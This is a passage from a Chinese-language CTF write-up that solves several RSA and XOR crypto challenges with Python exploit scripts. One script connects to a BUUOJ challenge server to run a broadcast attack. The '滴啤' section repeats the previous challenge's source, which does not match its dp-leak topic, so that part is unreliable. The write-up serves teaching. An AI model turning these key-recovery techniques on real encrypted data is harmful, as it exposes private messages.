c^d\ mod q \quad ②</script></li></ul><p>​        由①式，有:</p><p>​        <script type="math/tex">c^d = k*p + mp \quad ③</script></p><p>​        将③式带入②式，有</p><p>​        <script type="math/tex">k * p \equiv (m1 - m2) \mod q \\ k \equiv [p^{-1} * (m1 - m2)] \mod q</script></p><p>​        将k带入③式，有</p><p>​        <script type="math/tex">c^d = \{[p^{-1} * (m1 - m2)]\ mod q\} * p + mp</script></p><p>​        故:</p><p>​        <script type="math/tex">m \equiv c^d = \{[p^{-1} * (m1 - m2)] \mod p\} * q + m2 = h*q+m2</script></p><p>exp脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m2 = <span class="number">4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884</span></span><br><span class="line">h = <span class="number">4180720137090447835816240697100630525624574275</span></span><br><span class="line">q = <span class="number">7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931</span></span><br><span class="line"></span><br><span class="line">m = h*q+m2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231001214052436.png" class="" title="image-20231001214052436"><h3 id="Rotate-Xor"><a href="#Rotate-Xor" class="headerlink" title="Rotate Xor"></a>Rotate Xor</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line">k1 = getPrime(<span class="number">64</span>)</span><br><span class="line">k2 = getPrime(<span class="number">64</span>)</span><br><span class="line">ROUND = <span class="number">12</span></span><br><span class="line">ciphertext = xor(flag, long_to_bytes(k1))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_rotate_left</span>(<span class="params">num, step</span>):</span><br><span class="line">    <span class="keyword">return</span> ((num) &lt;&lt; step | num &gt;&gt; (<span class="number">64</span>-step)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_key</span>(<span class="params">key</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUND):</span><br><span class="line">        key = round_rotate_left(key, <span class="number">3</span>) ^ k2</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ciphertext =&#x27;</span>, ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc_k1 =&#x27;</span>, encrypt_key(k1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k2 =&#x27;</span>, k2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ciphertext = b&#x27;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde`zl\xc0\x85\xe0\xe4\xdfQlc&#x27;</span></span><br><span class="line"><span class="comment"># enc_k1 = 7318833940520128665</span></span><br><span class="line"><span class="comment"># k2 = 9982833494309156947</span></span><br></pre></td></tr></table></figure><p>由于密文用flag和k1异或，所以需要先求k1</p><p>分析<code>encrypt_key</code>函数</p><p>简单的回转加密，每轮将明文回转左移三位，然后与k2异或，一共进行12轮</p><p>那么解密倒着来就行</p><p>编写exp脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line">ciphertext = <span class="string">b&#x27;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde`zl\xc0\x85\xe0\xe4\xdfQlc&#x27;</span></span><br><span class="line">enc_k1 = <span class="number">7318833940520128665</span></span><br><span class="line">k2 = <span class="number">9982833494309156947</span></span><br><span class="line">ROUND = <span class="number">12</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_rotate_right</span>(<span class="params">num, step</span>):</span><br><span class="line">    <span class="keyword">return</span> ((num) &gt;&gt; step | num &lt;&lt; (<span class="number">64</span>-step)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUND):</span><br><span class="line">        key = round_rotate_right(key^k2, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">k1 = decrypt_key(enc_k1)</span><br><span class="line">flag = xor(ciphertext,long_to_bytes(k1))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231001215428894.png" class="" title="image-20231001215428894"><h3 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Welcome to RSA Broadcasting system</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">please select your option:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. brocast the flag</span></span><br><span class="line"><span class="string">2. exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">broadcast_the_flag</span>():</span><br><span class="line">    p = getPrime(<span class="number">256</span>)</span><br><span class="line">    q = getPrime(<span class="number">256</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(menu)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt = <span class="built_in">int</span>(opt)</span><br><span class="line">        <span class="keyword">if</span> opt == <span class="number">1</span>:</span><br><span class="line">            broadcast_the_flag()</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;invalid option&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;oh no, something wrong!&#x27;</span>)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>m、e相同，n、c不同，且e比较小，考虑经典的低加密指数广播攻击</p><p>编写exp脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="comment"># e, n, c</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25907</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    conn.recvuntil(<span class="string">b&quot;2. exit\n&quot;</span>)</span><br><span class="line">    conn.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    empty = conn.recvline()</span><br><span class="line">    n0 = <span class="built_in">int</span>(conn.recvline(keepends=<span class="literal">False</span>)[<span class="number">5</span>:])</span><br><span class="line">    n.append(n0)</span><br><span class="line">    c0 = <span class="built_in">int</span>(conn.recvline(keepends=<span class="literal">False</span>)[<span class="number">3</span>:])</span><br><span class="line">    c.append(c0)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">zip</span>(c, n))</span><br><span class="line">x, n = CRT(data)</span><br><span class="line">m = <span class="built_in">int</span>(gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(m)))</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231001222127378.png" class="" title="image-20231001222127378"><h3 id="halfcandecode"><a href="#halfcandecode" class="headerlink" title="halfcandecode"></a>halfcandecode</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">number</span>):</span><br><span class="line">    p = getPrime(number // <span class="number">2</span>)</span><br><span class="line">    q = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">return</span> p * q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> md5(m.encode()).hexdigest()</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = gen_prime(<span class="number">1024</span>)</span><br><span class="line">m1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>].encode() + os.urandom(<span class="number">8</span>))</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">m2 = flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(c1) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> m2:</span><br><span class="line">        f.write(<span class="built_in">str</span>(md5_hash(t))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前一半flag用RSA加密，后一半求每个字符的md5值</p><p>同时捕捉到突破口<code>next_prime</code>函数，一般来说gmpy2计算的下一个素数与上一个之间的差不大，小于1500</p><p>那么可以直接开方n，然后遍历得到p和q</p><p>编写exp脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969</span></span><br><span class="line">c1 = <span class="number">43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&#x27;_&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">n_2 = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_2,n_2+<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> (n%i==<span class="number">0</span>):</span><br><span class="line">        p = i</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi_n)</span><br><span class="line">m1 = c1 = <span class="built_in">pow</span>(c1, d, n)</span><br><span class="line">flag = long_to_bytes(m1)[:-<span class="number">8</span>].decode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">len</span>(data)):</span><br><span class="line">        md5_val = data[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">if</span>(md5(i.encode()).hexdigest()==md5_val):</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231001224333717.png" class="" title="image-20231001224333717"><h3 id="不止一个pi"><a href="#不止一个pi" class="headerlink" title="不止一个pi"></a>不止一个pi</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p**<span class="number">3</span>*q**<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>,p)</span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,<span class="number">65537</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># q =  115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></span><br><span class="line"><span class="comment"># p =  171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></span><br><span class="line"><span class="comment"># c =  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经典的多素数因子题目</p><p>信安数基里的重点内容，考虑到会有新手看我的wp，所以列一下原理</p><script type="math/tex; mode=display">\begin{flalign*}      &n=p_1^{k_1}p_2^{k_2}\cdots p_m^{k_m} \\     \varphi(n)& =\varphi(p_1^{k_1})\varphi(p_2^{k_2}) \cdots \varphi(p_m^{k_m}) \\      &=(p_1^{k_1-1}\cdot(p_1-1))(p_2^{k_2-1}\cdot(p_2-1)) \cdots (p_m^{k_m-1}\cdot(p_m-1))  \end{flalign*}</script><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">q =  <span class="number">115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></span><br><span class="line">p =  <span class="number">171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></span><br><span class="line">c =  <span class="number">4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n= p * q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*p**<span class="number">2</span>*(q-<span class="number">1</span>)*q</span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231001225329365.png" class="" title="image-20231001225329365"><h3 id="滴啤"><a href="#滴啤" class="headerlink" title="滴啤"></a>滴啤</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p**<span class="number">3</span>*q**<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>,p)</span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,<span class="number">65537</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># q =  115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></span><br><span class="line"><span class="comment"># p =  171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></span><br><span class="line"><span class="comment"># c =  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></span><br></pre></td></tr></table></figure><p>dp泄漏的题</p><p>原理如下：</p><script type="math/tex; mode=display">\because e * d \equiv 1 \mod((p-1)(q-1))\\ dp \equiv d \mod(p - 1)    \\ \therefore e*dp \equiv e*d \mod(p-1) \\ \therefore e*d = k_1(p-1)(q-1) + 1 = k_2(p-1) + e*dp               \\ e*dp = (p - 1)(k_1(q-1) - k_2)+1</script><p>  ​                    <script type="math/tex">\because dp < p  \\ \therefore e > (k_1(q-1) - k_2)\\ (k_1(q-1)-k_2) \in (1,e) \\遍历即可</script></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></span><br><span class="line">dp = <span class="number">307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></span><br><span class="line">c = <span 